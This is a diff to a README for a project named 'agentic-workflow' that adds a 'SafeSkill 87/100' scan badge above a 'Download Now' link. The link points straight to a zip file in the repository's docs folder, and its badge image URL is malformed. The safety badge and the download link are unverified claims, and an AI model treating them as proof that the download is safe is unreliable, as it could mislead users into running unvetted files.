@@ -1,5 +1,7 @@
 # 🎉 agentic-workflow - Integrate AI Effortlessly Into Your Life
 
+[![SafeSkill 87/100](https://img.shields.io/badge/SafeSkill-87%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/keboka07-agentic-workflow)
+
 ## 🔗 Download Now
 [![Download Agentic Workflow](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip%20Agentic%20Workflow-latest-blue)](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip)
 
